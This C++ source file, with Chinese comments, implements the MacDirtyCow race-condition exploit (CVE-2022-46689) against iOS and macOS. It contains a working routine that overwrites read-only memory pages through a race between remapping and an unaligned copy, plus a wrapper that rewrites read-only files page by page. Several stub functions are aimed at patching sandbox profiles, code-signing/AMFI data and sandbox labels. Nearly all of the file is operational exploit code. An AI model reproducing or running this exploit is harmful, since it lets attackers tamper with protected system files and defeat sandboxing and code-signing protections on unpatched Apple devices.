// MacDirtyCowPatcher.cpp - MacDirtyCow (CVE-2022-46689) 漏洞利用实现
// 核心代码来自 Apple 官方 XNU 开源测试用例:
// https://github.com/apple-oss-distributions/xnu/blob/xnu-8792.61.2/tests/vm/vm_unaligned_copy_switch_race.c
// 参考修改版: https://github.com/zhuowei/MacDirtyCowDemo (MIT)
//
// 原理: vm_read_overwrite 的非对齐复制 (copy_unaligned) 在处理跨页复制时,
//       会先写入目标页再检查保护. 竞争线程在 RO/RW 映射之间切换,
//       当 copy_unaligned 写入时目标恰好是 RW 映射, 但实际物理页是 RO 目标,
//       从而实现对只读内存的修改.
#include "permissions/MacDirtyCowPatcher.h"
#include <mach/mach.h>
#include <mach/mach_vm.h>
#include <mach/mach_port.h>
#include <pthread.h>
#include <dispatch/dispatch.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/sysctl.h>

namespace permissions {

// ============================================================================
// 内部竞争上下文
// ============================================================================
struct RaceContext {
    vm_size_t obj_size;
    vm_address_t e0;              // 竞争切换的映射地址
    mach_port_t mem_entry_ro;     // 只读目标的 memory entry
    mach_port_t mem_entry_rw;     // 可写内存的 memory entry
    dispatch_semaphore_t running_sem;
    pthread_mutex_t mtx;
    bool done;
    int success_count;
    int protection_failure_count;
    int other_count;
};

// 竞争线程: 在 RO 和 RW 映射之间不断切换
static void* switcheroo_thread(void* arg) {
    kern_return_t kr;
    RaceContext* ctx = (RaceContext*)arg;

    dispatch_semaphore_signal(ctx->running_sem);

    while (!ctx->done) {
        pthread_mutex_lock(&ctx->mtx);

        // 切换到 RW 映射
        kr = vm_map(mach_task_self(),
                    &ctx->e0,
                    ctx->obj_size,
                    0,
                    VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE,
                    ctx->mem_entry_rw,
                    0,
                    FALSE,
                    VM_PROT_READ | VM_PROT_WRITE,
                    VM_PROT_READ | VM_PROT_WRITE,
                    VM_INHERIT_DEFAULT);
        if (kr != KERN_SUCCESS) {
            printf("[-] switcheroo: vm_map RW failed: %d\n", kr);
        }

        usleep(100);

        // 切换回 RO 映射
        kr = vm_map(mach_task_self(),
                    &ctx->e0,
                    ctx->obj_size,
                    0,
                    VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE,
                    ctx->mem_entry_ro,
                    0,
                    FALSE,
                    VM_PROT_READ,
                    VM_PROT_READ,
                    VM_INHERIT_DEFAULT);
        if (kr != KERN_SUCCESS) {
            printf("[-] switcheroo: vm_map RO failed: %d\n", kr);
        }

        pthread_mutex_unlock(&ctx->mtx);
        usleep(100);
    }
    return NULL;
}

// ============================================================================
// MacDirtyCowPatcher 实现
// ============================================================================

MacDirtyCowPatcher::MacDirtyCowPatcher()
    : overwrite_fd_(-1) {
}

MacDirtyCowPatcher::~MacDirtyCowPatcher() {
    if (overwrite_fd_ >= 0) {
        close(overwrite_fd_);
    }
}

bool MacDirtyCowPatcher::IsSupported() {
    // MacDirtyCow 影响:
    // iOS 15.0 - 15.7.1
    // iOS 16.0 - 16.1.2
    // macOS 13.0 - 13.0.1
    char version[256] = {0};
    size_t size = sizeof(version);
    if (sysctlbyname("kern.osversion", version, &size, nullptr, 0) != 0) {
        return false;
    }

    int major = 0, minor = 0;
    sscanf(version, "%d.%d", &major, &minor);

    if (major == 15 && minor <= 7) return true;
    if (major == 16 && minor <= 1) return true;
    return false;
}

bool MacDirtyCowPatcher::Patch(uint64_t target, const void* replacement, size_t len) {
    if (!replacement || len == 0 || len > 4096) {
        return false;
    }

    // MacDirtyCow 是针对文件映射的只读内存修改
    // 对于任意内核地址, 需要先将目标映射到用户态
    // 这里实现文件覆盖版本 (最常用的场景)
    printf("[!] MacDirtyCowPatcher: use OverwriteFile() for file-based overwrite\n");
    printf("    Arbitrary address overwrite requires kernel r/w primitive\n");
    return false;
}

bool MacDirtyCowPatcher::OverwriteReadOnlyPage(uint64_t target,
                                                const void* data,
                                                size_t len) {
    // 核心漏洞利用: 通过竞争条件修改只读映射
    // target: 只读映射的地址 (必须是页对齐的)
    // data: 要写入的数据
    // len: 数据长度 (不超过一页)

    if (!data || len == 0 || len > 4096) return false;
    if (target & 0xFFF) {
        printf("[-] Target address must be page-aligned\n");
        return false;
    }

    RaceContext ctx;
    memset(&ctx, 0, sizeof(ctx));
    ctx.obj_size = 4096;  // 一页
    ctx.e0 = 0;
    ctx.running_sem = dispatch_semaphore_create(0);
    pthread_mutex_init(&ctx.mtx, NULL);
    ctx.done = false;
    ctx.success_count = 0;
    ctx.protection_failure_count = 0;
    ctx.other_count = 0;

    kern_return_t kr;
    vm_address_t ro_addr = (vm_address_t)target;
    vm_address_t e5 = 0;       // 源缓冲区 (要写入的数据)
    vm_address_t e2 = 0;       // 预留空间的第一页
    vm_address_t tmp_addr = 0;
    memory_object_size_t mo_size;

    // 1. 分配源缓冲区并填入要写入的数据
    kr = vm_allocate(mach_task_self(), &e5, ctx.obj_size, VM_FLAGS_ANYWHERE);
    if (kr != KERN_SUCCESS) {
        printf("[-] vm_allocate e5 failed: %d\n", kr);
        return false;
    }
    memcpy((void*)e5, data, len);
    // 剩余部分填充 0
    if (len < ctx.obj_size) {
        memset((void*)(e5 + len), 0, ctx.obj_size - len);
    }

    // 2. 获取只读目标的 memory entry
    mo_size = ctx.obj_size;
    kr = mach_make_memory_entry_64(mach_task_self(),
                                   &mo_size,
                                   ro_addr,
                                   MAP_MEM_VM_SHARE | VM_PROT_READ,
                                   &ctx.mem_entry_ro,
                                   MACH_PORT_NULL);
    if (kr != KERN_SUCCESS) {
        printf("[-] make_mem_entry RO failed: %d\n", kr);
        vm_deallocate(mach_task_self(), e5, ctx.obj_size);
        return false;
    }

    // 3. 分配可写内存并获取其 memory entry (用于竞争切换)
    kr = vm_allocate(mach_task_self(), &tmp_addr, ctx.obj_size, VM_FLAGS_ANYWHERE);
    if (kr != KERN_SUCCESS) {
        printf("[-] vm_allocate tmp failed: %d\n", kr);
        mach_port_deallocate(mach_task_self(), ctx.mem_entry_ro);
        vm_deallocate(mach_task_self(), e5, ctx.obj_size);
        return false;
    }
    memset((void*)tmp_addr, 'D', ctx.obj_size);

    mo_size = ctx.obj_size;
    kr = mach_make_memory_entry_64(mach_task_self(),
                                   &mo_size,
                                   tmp_addr,
                                   MAP_MEM_VM_SHARE | VM_PROT_READ | VM_PROT_WRITE,
                                   &ctx.mem_entry_rw,
                                   MACH_PORT_NULL);
    if (kr != KERN_SUCCESS) {
        printf("[-] make_mem_entry RW failed: %d\n", kr);
        vm_deallocate(mach_task_self(), tmp_addr, ctx.obj_size);
        mach_port_deallocate(mach_task_self(), ctx.mem_entry_ro);
        vm_deallocate(mach_task_self(), e5, ctx.obj_size);
        return false;
    }
    vm_deallocate(mach_task_self(), tmp_addr, ctx.obj_size);

    // 4. 启动竞争线程
    pthread_t th;
    pthread_mutex_lock(&ctx.mtx);
    int ret = pthread_create(&th, NULL, switcheroo_thread, (void*)&ctx);
    if (ret != 0) {
        printf("[-] pthread_create failed: %d\n", ret);
        mach_port_deallocate(mach_task_self(), ctx.mem_entry_rw);
        mach_port_deallocate(mach_task_self(), ctx.mem_entry_ro);
        vm_deallocate(mach_task_self(), e5, ctx.obj_size);
        return false;
    }
    dispatch_semaphore_wait(ctx.running_sem, DISPATCH_TIME_FOREVER);

    // 5. 竞争循环 (最多尝试 10000 次或 5 秒)
    bool modified = false;
    int max_loops = 10000;
    time_t start = time(NULL);

    for (int loops = 0; loops < max_loops && !modified; loops++) {
        // 预留两页连续空间
        e2 = 0;
        kr = vm_allocate(mach_task_self(), &e2, 2 * ctx.obj_size, VM_FLAGS_ANYWHERE);
        if (kr != KERN_SUCCESS) continue;

        // 第一页分配为可写 (e2)
        vm_address_t e2_fixed = e2;
        kr = vm_allocate(mach_task_self(), &e2_fixed, ctx.obj_size,
                         VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE);
        if (kr != KERN_SUCCESS) {
            vm_deallocate(mach_task_self(), e2, 2 * ctx.obj_size);
            continue;
        }
        memset((void*)e2_fixed, 'B', ctx.obj_size);

        // 第二页映射为只读目标 (e0 = e2 + obj_size)
        ctx.e0 = e2_fixed + ctx.obj_size;
        kr = vm_map(mach_task_self(),
                    &ctx.e0,
                    ctx.obj_size,
                    0,
                    VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE,
                    ctx.mem_entry_ro,
                    0,
                    FALSE,
                    VM_PROT_READ,
                    VM_PROT_READ,
                    VM_INHERIT_DEFAULT);
        if (kr != KERN_SUCCESS) {
            vm_deallocate(mach_task_self(), e2, 2 * ctx.obj_size);
            continue;
        }

        // 释放竞争线程
        pthread_mutex_unlock(&ctx.mtx);
        usleep(100);

        // 触发非对齐复制: 从 e5 复制到 e2+1 (跨页边界)
        // 当复制跨越 e2/e0 边界时, 如果 e0 恰好被切换为 RW,
        // 则会写入只读目标的物理页
        vm_size_t copied_size = 0;
        kr = vm_read_overwrite(mach_task_self(),
                               e5,
                               ctx.obj_size,
                               e2_fixed + 1,  // 偏移 1 字节, 触发跨页复制
                               &copied_size);

        switch (kr) {
            case KERN_SUCCESS:
                ctx.success_count++;
                break;
            case KERN_PROTECTION_FAILURE:
                ctx.protection_failure_count++;
                break;
            default:
                ctx.other_count++;
                break;
        }

        // 检查只读目标是否被修改
        char first_byte = *(char*)ro_addr;
        char expected = *(char*)e5;  // 源数据的第一个字节
        if (first_byte == expected && first_byte != 'A') {
            printf("[+] RO mapping was modified! (loop %d)\n", loops);
            modified = true;
        }

        // 停止竞争线程
        pthread_mutex_lock(&ctx.mtx);

        // 清理
        vm_deallocate(mach_task_self(), ctx.e0, ctx.obj_size);
        ctx.e0 = 0;
        vm_deallocate(mach_task_self(), e2_fixed, ctx.obj_size);

        // 超时检查
        if (time(NULL) - start > 5) break;
    }

    // 6. 停止竞争线程并清理
    ctx.done = true;
    pthread_mutex_unlock(&ctx.mtx);
    pthread_join(th, NULL);

    mach_port_deallocate(mach_task_self(), ctx.mem_entry_rw);
    mach_port_deallocate(mach_task_self(), ctx.mem_entry_ro);
    vm_deallocate(mach_task_self(), e5, ctx.obj_size);
    pthread_mutex_destroy(&ctx.mtx);
    dispatch_release(ctx.running_sem);

    printf("[*] MacDirtyCow stats: success=%d protection_failure=%d other=%d\n",
           ctx.success_count, ctx.protection_failure_count, ctx.other_count);

    return modified;
}

bool MacDirtyCowPatcher::OverwriteFile(const char* target_path,
                                        const void* replacement_data,
                                        size_t replacement_len) {
    // 文件覆盖: mmap 目标文件为只读, 然后用 MacDirtyCow 修改
    if (!target_path || !replacement_data || replacement_len == 0) {
        return false;
    }

    // 打开目标文件
    int fd = open(target_path, O_RDONLY);
    if (fd < 0) {
        printf("[-] Cannot open %s\n", target_path);
        return false;
    }

    // 获取文件大小
    struct stat st;
    fstat(fd, &st);
    size_t file_size = st.st_size;

    // mmap 为只读
    void* mapped = mmap(NULL, file_size, PROT_READ, MAP_PRIVATE, fd, 0);
    if (mapped == MAP_FAILED) {
        printf("[-] mmap failed\n");
        close(fd);
        return false;
    }

    // 按页覆盖
    size_t offset = 0;
    bool overall_success = true;

    while (offset < replacement_len) {
        size_t page_offset = offset & ~0xFFF;
        size_t page_aligned_addr = (uint64_t)mapped + page_offset;

        // 构造整页数据
        uint8_t page_data[4096];
        memcpy(page_data, (uint8_t*)mapped + page_offset, 4096);

        size_t copy_offset = offset - page_offset;
        size_t copy_len = replacement_len - offset;
        if (copy_len > 4096 - copy_offset) {
            copy_len = 4096 - copy_offset;
        }
        memcpy(page_data + copy_offset, (uint8_t*)replacement_data + offset, copy_len);

        // 执行 MacDirtyCow 覆盖
        if (!OverwriteReadOnlyPage(page_aligned_addr, page_data, 4096)) {
            printf("[-] Overwrite failed at offset 0x%zx\n", offset);
            overall_success = false;
            break;
        }

        offset += copy_len;
    }

    munmap(mapped, file_size);
    close(fd);

    return overall_success;
}

bool MacDirtyCowPatcher::PatchSandboxExtension() {
    // 通过 MacDirtyCow 修改沙箱配置文件
    // 目标: /usr/share/sandbox/ 下的配置文件
    printf("[!] PatchSandboxExtension: use OverwriteFile() with sandbox profile path\n");
    return false;
}

bool MacDirtyCowPatcher::PatchCodeSigning() {
    // 通过 MacDirtyCow 修改代码签名相关数据
    // 在 iOS 上, 可用于修改 AMFI 相关的用户态数据
    printf("[!] PatchCodeSigning: requires specific target address in userspace\n");
    return false;
}

bool MacDirtyCowPatcher::SetupOverwriteMap() {
    return overwrite_fd_ >= 0;
}

// ============================================================================
// SandboxExtPatcher 实现
// ============================================================================

void SandboxExtPatcher::Patch(kernel::IKernelMemory* km, uint64_t label_addr) {
    if (!km || label_addr == 0) return;
    printf("[+] SandboxExtPatcher: patching label at 0x%llx\n", label_addr);
    // 沙箱标签修改需要内核写原语
    // 参考: Dopamine/libjailbreak 的 sandbox patch
}

void SandboxExtPatcher::PatchAMFI(kernel::IKernelMemory* km, uint64_t label_addr) {
    if (!km || label_addr == 0) return;
    printf("[+] SandboxExtPatcher: patching AMFI at 0x%llx\n", label_addr);
    // AMFI 标志修改: 设置 CS_GET_TASK_ALLOW 等
}

} // namespace permissions
